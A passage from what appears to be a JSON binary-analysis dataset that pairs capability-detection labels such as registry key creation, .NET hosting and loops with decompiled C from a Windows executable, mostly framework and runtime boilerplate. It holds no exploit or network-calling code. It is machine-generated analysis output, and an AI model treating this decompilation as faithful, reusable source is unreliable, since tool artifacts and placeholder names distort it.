   phkResult = unaff_EDI;\n    var_120h = unaff_ESI;\n    var_11ch = unaff_EBX;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(*(unaff_EBP + 8), uVar1, unaff_EBP + -0x124);\n    if (iVar2 == 0) {\n        while( true ) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyA)(*(unaff_EBP + -0x124), 0, unaff_EBP + -0x11c, 0x104);\n            if (iVar2 != 0) break;\n            *(unaff_EBP + -4) = 0;\n            iVar2 = unaff_EBP + -0x11c;\n            fcn.0040cde0();\n            *(unaff_EBP + -4) = 1;\n            iVar2 = fcn.00438142(*(unaff_EBP + -0x124), unaff_EBP + -0x120, iVar2, phkResult, var_120h, var_11ch, \n                                 in_stack_fffffee4, in_stack_fffffee8, in_stack_fffffeec, in_stack_fffffef0, \n                                 in_stack_fffffef4, in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00, \n                                 in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c, in_stack_ffffff10, \n                                 in_stack_ffffff14, in_stack_ffffff18, in_stack_ffffff1c, in_stack_ffffff20, \n                                 in_stack_ffffff24, in_stack_ffffff28, in_stack_ffffff2c, in_stack_ffffff30, \n                                 in_stack_ffffff34, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40, \n                                 in_stack_ffffff44, in_stack_ffffff48, in_stack_ffffff4c, in_stack_ffffff50, \n                                 in_stack_ffffff54, in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, \n                                 in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, in_stack_ffffff70, \n                                 in_stack_ffffff74, in_stack_ffffff78, in_stack_ffffff7c, in_stack_ffffff80, \n                                 in_stack_ffffff84, in_stack_ffffff88, in_stack_ffffff8c, in_stack_ffffff90, \n                                 in_stack_ffffff94, in_stack_ffffff98, in_stack_ffffff9c, in_stack_ffffffa0, \n                                 in_stack_ffffffa4, in_stack_ffffffa8, in_stack_ffffffac, in_stack_ffffffb0, \n                                 in_stack_ffffffb4, in_stack_ffffffb8, in_stack_ffffffbc, in_stack_ffffffc0, \n                                 in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, in_stack_ffffffd8, in_stack_ffffffdc, in_stack_ffffffe0, \n                                 in_stack_ffffffe4, var_14h_2, in_stack_ffffffec, var_ch, in_stack_fffffff4, var_4h);\n            *(unaff_EBP + -4) = 0;\n            fcn.004014f0();\n            if (iVar2 != 0) break;\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n        if ((iVar2 == 0x103) || (iVar2 == 0x3f2)) {\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(*(unaff_EBP + 8), **(unaff_EBP + 0xc));\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(unaff_EBP + -0x124));\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 2230
    },
    "004390f7": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004390f7(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\", 0, 0x2001f, &var_4h);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCreateKeyExA;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (var_4h, *(param_1 + 0x50), 0, 0, 0, 0x2001f, 0, &var_8h, &var_10h);\n        if (iVar2 == 0) {\n            (*pcVar1)(var_8h, *(param_1 + 100), 0, 0, 0, 0x2001f, 0, &var_ch, &var_10h);\n        }\n    }\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (var_4h != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    }\n    if (var_8h != 0) {\n        (*pcVar1)(var_8h);\n    }\n    return var_ch;\n}\n",
        "token_count": 379
    },
    "00439188": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00439188(uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.004390f7();\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(iVar1, lpSubKey, 0, 0, 0, 0x2001f, 0, &var_4h, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 164
    },
    "004291cc": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nuint fcn.004291cc(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0xffffffff;\n    piVar2 = fcn.0042fa75();\n    iVar3 = fcn.00438818();\n    piVar1 = *(iVar3 + 4);\n    iVar3 = fcn.00439418(param_1, param_2, param_3, param_4);\n    if ((iVar3 != 0) && ((piVar1 == NULL || (iVar3 = (**(*piVar1 + 0x90))(),  iVar3 != 0)))) {\n        iVar3 = (**(*piVar2 + 0x50))();\n        if (iVar3 == 0) {\n            if (piVar2[7] != 0) {\n                (**(*piVar2[7] + 0x60))();\n            }\n            uVar4 = (**(*piVar2 + 0x68))();\n        }\n        else {\n            uVar4 = (**(*piVar2 + 0x54))();\n        }\n    }\n    fcn.0043b15c();\n    return uVar4;\n}\n",
        "token_count": 291
    },
    "00402d10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00402d10(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (param_1 == NULL) {\n        fcn.00402860(0, 0);\n        return;\n    }\n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00402860(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 130
    },
    "00407220": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00407220(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00402bb0(param_1, pcVar2 - (param_1 + 1));\n    return;\n}\n",
        "token_count": 102
    },
    "00410835": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00410835(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    code *pcVar2;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumUnknown.0;\n    pcVar2 = NULL;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if ((pcVar1 == NULL) && (pcVar1 = extraout_ECX[9],  extraout_ECX[0xb] != NULL)) {\n        do {\n            (**(**(pcVar1 + pcVar2 * 4) + 8))(*(pcVar1 + pcVar2 * 4));\n            pcVar2 = pcVar2 + 1;\n        } while (pcVar2 < extraout_ECX[0xb]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00439b6b();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 333
    },
    "004140c2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004140c2(uint *arg_8h)\n\n{\n    int32_t *in_ECX;\n    uint32_t uVar1;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = 0;\n    if (in_ECX[1] != 0) {\n        var_4h = in_ECX;\n        fcn.00413e25();\n        var_8h = (***arg_8h)(arg_8h, 0x440ad4, &var_4h);\n        if ((-1 < var_8h) && (uVar1 = 0,  in_ECX[1] != 0)) {\n            do {\n                (**(*var_4h + 0x18))(var_4h, *(*in_ECX + uVar1 * 8), 0);\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < in_ECX[1]);\n        }\n        in_ECX[1] = 0;\n        fcn.0042f834(*in_ECX);\n        *in_ECX = 0;\n        fcn.00412e28();\n    }\n    return var_8h;\n}\n",
        "token_count": 279
    },
    "004148d7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004148d7(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar1 = *(*(param_1 + 8) + 4);\n    iVar2 = 0;\n    uVar3 = 0;\n    if (uVar1 != 0) {\n        do {\n            iVar2 = fcn.00413e2b();\n            if (iVar2 < 0) {\n                return iVar2;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar1);\n    }\n    return iVar2;\n}\n",
        "token_count": 154
    },
    "00416ee0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00416ee0(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t unaff_EBX;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar4 = 0;\n    iVar5 = iVar4;\n    if (param_2 != 0) {\n        do {\n            iVar5 = param_2;\n            uVar2 = (*pcVar1)(*(iVar5 + 0x1c), 0xfffffff0);\n            if ((uVar2 & 0xc0000000) != 0x40000000) {\n                return iVar4;\n            }\n            if (iVar5 == unaff_EBX) {\n                return iVar4;\n            }\n            uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(iVar5 + 0x1c));\n            param_2 = fcn.0042cb01(uVar3);\n            uVar2 = (*pcVar1)(*(param_2 + 0x1c), 0xffffffec);\n            iVar4 = iVar5;\n        } while ((uVar2 & 0x10000) == 0);\n    }\n    return iVar5;\n}\n",
        "token_count": 296
    },
    "00417248": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00417248(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if (param_1 != 0) {\n        piVar4 = NULL;\n        iVar3 = param_1;\n        do {\n            iVar1 = *(iVar3 + 0x48);\n            if ((iVar1 != 0) || (piVar4 = *(iVar3 + 0x4c),  piVar4 != NULL)) break;\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar3 + 0x1c));\n            iVar3 = fcn.0042cb01(uVar2);\n        } while (iVar3 != 0);\n        if ((iVar3 != 0) && (iVar1 == 0)) {\n            (**(*piVar4 + 0xb0))();\n            uVar2 = (*_sym.imp.USER32.dll_GetFocus)();\n            iVar3 = fcn.0042cb01(uVar2);\n            if ((iVar3 != param_1) && (iVar3 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x1c)),  iVar3 != 0)) {\n                if (*(param_1 + 0x4c) != 0) {\n    // WARNING: Could not recover jumptable at 0x0042ed4d. Too many branches\n    // WARNING: Treating indirect jump as call\n                    (**(**(param_1 + 0x4c) + 0xb0))();\n                    return;\n                }\n                uVar2 = (*_sym.imp.USER32.dll_SetFocus)(*(param_1 + 0x1c));\n                fcn.0042cb01(uVar2);\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 407
    },
    "004172b5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004172d4)\n// WARNING: Removing unreachable block (ram,0x004172d6)\n// WARNING: Removing unreachable block (ram,0x004172f2)\n// WARNING: Removing unreachable block (ram,0x004172fb)\n// WARNING: Removing unreachable block (ram,0x00417300)\n// WARNING: Removing unreachable block (ram,0x0041730c)\n// WARNING: Removing unreachable block (ram,0x00417310)\n// WARNING: Removing unreachable block (ram,0x00417314)\n// WARNING: Removing unreachable block (ram,0x00417318)\n// WARNING: Removing unreachable block (ram,0x00417324)\n// WARNING: Removing unreachable block (ram,0x004172dd)\n// WARNING: Removing unreachable block (ram,0x004172f0)\n\nvoid fcn.004172b5(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n        (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x1c));\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "00417330": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00417330(int32_t param_1, int32_t param_2)\n\n{\n    int32_t noname_5;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t noname_1;\n    uint unaff_EBX;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    int32_t noname_4;\n    uint noname_6;\n    int32_t noname_4_00;\n    \n    noname_4_00 = param_2;\n    noname_5 = fcn.0042eb82();\n    if (noname_5 == 0) {\n        noname_6 = 1;\n        noname_4 = param_1;\n        iVar1 = fcn.00416f35(param_1, 0, 1, unaff_EBX, noname_4_00, unaff_EDI, unaff_retaddr, param_1, param_2);\n        noname_1 = iVar1;\n        if (iVar1 == param_1) {\n            noname_5 = 0;\n        }\n        else {\n            do {\n                iVar2 = fcn.0042ec7c();\n                if (iVar2 == noname_4_00) {\n                    return noname_1;\n                }\n                noname_1 = fcn.00416f35(param_1, noname_1, 1, param_1, noname_4, noname_5, noname_6, unaff_EBX, \n                                        noname_4_00);\n            } while ((noname_1 != 0) && (noname_1 != iVar1));\n            noname_5 = 0;\n        }\n    }\n    return noname_5;\n}\n",
        "token_count": 388
    },
    "004173d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004173d4(uint param_1, int32_t param_2, uint param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t noname_1;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint noname_4;\n    int32_t noname_5;\n    \n    if (param_2 != 0) {\n        noname_4 = *(param_2 + 0x1c);\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(noname_4, 0xffffffec);\n        if ((uVar1 & 0x10000) == 0) {\n            iVar2 = fcn.00416ee0();\n            noname_5 = param_2;\n            goto code_r0x00417409;\n        }\n    }\n    noname_5 = 3;\n    noname_4 = 0;\n    iVar2 = fcn.00416f35(param_1, 0, 3, unaff_EDI, unaff_ESI, unaff_retaddr, param_1, param_2, param_3);\ncode_r0x00417409:\n    noname_1 = iVar2;\n    if (iVar2 != 0) {\n        do {\n            fcn.00417387(noname_1, 0);\n            noname_1 = fcn.00416f35(unaff_EDI, noname_1, 0, unaff_EDI, noname_4, noname_5, unaff_EDI, unaff_ESI, \n                                    unaff_retaddr);\n            if (noname_1 == 0) {\n                return;\n            }\n        } while (noname_1 != iVar2);\n    }\n    return;\n}\n",
        "token_count": 402
    },
    "00417d60": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00417d60(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    iVar2 = fcn.00438818();\n    puVar3 = 0xb;\n    fcn.00439038(0xb);\n    while (puVar1 = *(iVar2 + 0x103c),  puVar1 != NULL) {\n        puVar3 = puVar1;\n        fcn.00438ba9();\n        if (puVar1 != NULL) {\n            (***puVar1)(1);\n        }\n    }\n    fcn.0043909b(0xb, puVar3);\n    return;\n}\n",
        "token_count": 151
    },
    "004180b1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004180b1(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.0041b5aa();\n    piVar2 = *(iVar1 + 0x88);\n    while( true ) {\n        if (piVar2 == NULL) {\n            return 1;\n        }\n        if (*piVar2 == param_1) break;\n        piVar2 = piVar2[1];\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "00418bbd": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint16_t * fcn.00418bbd(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = param_1;\n    do {\n        iVar1 = *param_2;\n        *piVar2 = iVar1;\n        piVar2 = piVar2 + 1;\n        param_2 = param_2 + 1;\n    } while (iVar1 != 0);\n    return param_1;\n}\n",
        "token_count": 117
    },
    "0041a93c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041a93c(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0041b5aa();\n    *(iVar1 + 0xc) = param_1;\n    uVar2 = 0;\n    do {\n        if (param_1 == *(uVar2 * 8 + 0x44d380)) {\n            iVar1 = fcn.0041b5aa();\n            *(iVar1 + 8) = *(uVar2 * 8 + 0x44d384);\n            return;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0x2d);\n    if ((0x12 < param_1) && (param_1 < 0x25)) {\n        iVar1 = fcn.0041b5aa();\n        *(iVar1 + 8) = 0xd;\n        return;\n    }\n    if ((0xbb < param_1) && (param_1 < 0xcb)) {\n        iVar1 = fcn.0041b5aa();\n        *(iVar1 + 8) = 8;\n        return;\n    }\n    iVar1 = fcn.0041b5aa();\n    *(iVar1 + 8) = 0x16;\n    return;\n}\n",
        "token_count": 299
    },
    "0042432b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042432b(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    while( true ) {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (((cVar1 < 'A') || ('Z' < cVar1)) && ((cVar1 < 'a' || ('z' < cVar1)))) break;\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 131
    },
    "00426def": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426def(int32_t param_1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    fcn.00428617(2);\n    *(param_1 + 4) = 1;\n    do {\n        iVar2 = *(*(param_1 + 4) * 4 + 0x450c5c);\n        if ((iVar2 == 0) || (iVar2 == param_1)) break;\n        *(param_1 + 4) = *(param_1 + 4) + 1;\n    } while (*(param_1 + 4) < 8);\n    *(*(param_1 + 4) * 4 + 0x450c5c) = param_1;\n    pcVar1 = *(param_1 + 4) + 0x450c84;\n    *pcVar1 = *pcVar1 + '\\x01';\n    fcn.0042863a();\n    return;\n}\n",
        "token_count": 224
    },
    "00426e40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426e40(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    \n    fcn.00426dcd(0);\n    puVar2 = *(param_1 + 0x1c);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.0042f834(puVar2);\n        puVar2 = puVar1;\n    }\n    *(param_1 + 0x1c) = 0;\n    puVar2 = *(param_1 + 0x20);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.0042f834(puVar2);\n        puVar2 = puVar1;\n    }\n    *(param_1 + 0x20) = 0;\n    return;\n}\n",
        "token_count": 199
    },
    "00428778": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00428778(void)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    code *pcVar3;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *extraout_ECX = vtable.std::locale::_Locimp.0;\n    *(unaff_EBP + -4) = 1;\n    fcn.00428617(0);\n    pcVar3 = extraout_ECX[3];\n    *(unaff_EBP + -4) = 2;\n    while (pcVar3 != NULL) {\n        pcVar3 = pcVar3 + -1;\n        if (*(extraout_ECX[2] + pcVar3 * 4) != 0) {\n            puVar2 = fcn.00426d64();\n            if (puVar2 != NULL) {\n                (***puVar2)(1);\n            }\n        }\n    }\n    fcn.00418911(extraout_ECX[2]);\n    *(unaff_EBP + -4) = 1;\n    fcn.0042863a();\n    fcn.00401e00(1, 0);\n    uVar1 = *(unaff_EBP + -0xc);\n    *extraout_ECX = vtable.std::locale::facet.0;\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 402
    },
    "0042a267": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042a267(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    if (param_3 != NULL) goto code_r0x0042a27d;\n    for (param_3 = *(param_1 + 4); (param_3 != NULL && (param_3[2] != param_2)); param_3 = *param_3) {\ncode_r0x0042a27d:\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0042a3e7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a3e7(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1 != NULL) {\n        do {\n            piVar1 = *param_1;\n            fcn.0042f834(param_1);\n            param_1 = piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "0042a652": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0042a652(int32_t param_1, uint32_t param_2, uint32_t *param_3, uint32_t *param_4)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    *param_4 = param_2 >> 4;\n    uVar2 = (param_2 >> 4) % *(param_1 + 8);\n    *param_3 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + uVar2 * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 192
    },
    "0042a68a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042a68a(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    \n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 140
    },
    "0042a6c1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0042a6c1(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    \n    if (*(param_1 + 4) == 0) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar3 = *(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4;\n        puVar1 = *puVar3;\n        while (puVar2 = puVar1,  puVar2 != NULL) {\n            if (puVar2[1] == param_2) {\n                *puVar3 = *puVar2;\n                fcn.0042a639(puVar2);\n                return 0x1;\n            }\n            puVar3 = puVar2;\n            puVar1 = *puVar2;\n        }\n    }\n    return puVar2;\n}\n",
        "token_count": 221
    },
    "0042c1c8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0042c1c8(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(param_1 + 4));\n    iVar3 = 0;\n    if (0 < iVar1) {\n        do {\n            iVar2 = fcn.0040dac0(iVar3);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.USER32.dll_GetMenuItemID)(*(param_1 + 4), iVar3);\n                if (iVar2 == param_1) {\n                    iVar1 = fcn.0043016c(*(param_1 + 4));\n                    return iVar1;\n                }\n            }\n            else {\n                iVar2 = fcn.0042c1c8(iVar2, unaff_retaddr);\n                if (iVar2 != 0) {\n                    return iVar2;\n                }\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 254
    },
    "0042cdf1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cdf1(uint hDlg, uint nIDDlgItem, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetDlgItem)(hDlg, nIDDlgItem);\n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(iVar2);\n        if ((iVar3 != 0) && (iVar3 = fcn.0042cdf1(iVar2, nIDDlgItem, arg_10h),  iVar3 != 0)) {\n            return;\n        }\n        if (arg_10h == 0) {\n            fcn.0042cb01();\n            return;\n        }\n        iVar2 = fcn.0042cb28(iVar2);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    iVar2 = (*pcVar1)(hDlg);\n    while( true ) {\n        if (iVar2 == 0) {\n            return;\n        }\n        iVar3 = fcn.0042cdf1(iVar2, nIDDlgItem, arg_10h);\n        if (iVar3 != 0) break;\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "0042cfb0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0042cfb0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar3 = *param_2;\n    while( true ) {\n        if (iVar3 == 0) {\n            return 0;\n        }\n        piVar1 = fcn.0042cb28(iVar3);\n        if ((piVar1 != NULL) && (iVar2 = (**(*piVar1 + 0x100))(param_2),  iVar2 != 0)) break;\n        if (iVar3 == unaff_retaddr) {\n            return 0;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)(iVar3);\n    }\n    return 1;\n}\n",
        "token_count": 187
    },
    "0042d107": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042d107(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint lpMsg;\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        iVar2 = (*pcVar1)(&lpMsg, 0, 0x121, 0x121, 1);\n        if (iVar2 == 0) break;\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n    }\n    fcn.0042ca5e();\n    return;\n}\n",
        "token_count": 128
    },
    "0042d465": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042d465(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    if ((param_1 != 0) && (iVar2 = *(param_1 + 0x1c),  iVar2 != 0)) {\n        while( true ) {\n            uVar3 = (*pcVar1)(iVar2);\n            piVar4 = fcn.0042cb01(uVar3);\n            if ((piVar4 == NULL) || (iVar2 = (**(*piVar4 + 0x120))(),  iVar2 != 0)) break;\n            iVar2 = piVar4[7];\n        }\n        return piVar4;\n    }\n    return NULL;\n}\n",
        "token_count": 195
    },
    "0042d950": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042d950(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((param_1 != 0) && (iVar1 = *(param_1 + 0x1c),  *(param_1 + 0x1c) != 0)) {\n        do {\n            iVar3 = iVar1;\n            iVar1 = fcn.0042d90b(iVar3);\n        } while (iVar1 != 0);\n        uVar2 = fcn.0042cb01(iVar3);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 149
    },
    "0042f804": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0042f804(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.004188ff(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x44c624 == NULL) break;\n        iVar1 = (**0x44c624)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 115
    },
    "00430a13": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00430a13(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (***param_1)();\n    if (param_2 != 0) {\n        for (; iVar1 != 0; iVar1 = *(iVar1 + 0x10)) {\n            if (iVar1 == param_2) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 105
    },
    "004336e3": {
        "rules": [
            "contain loop"
        ],
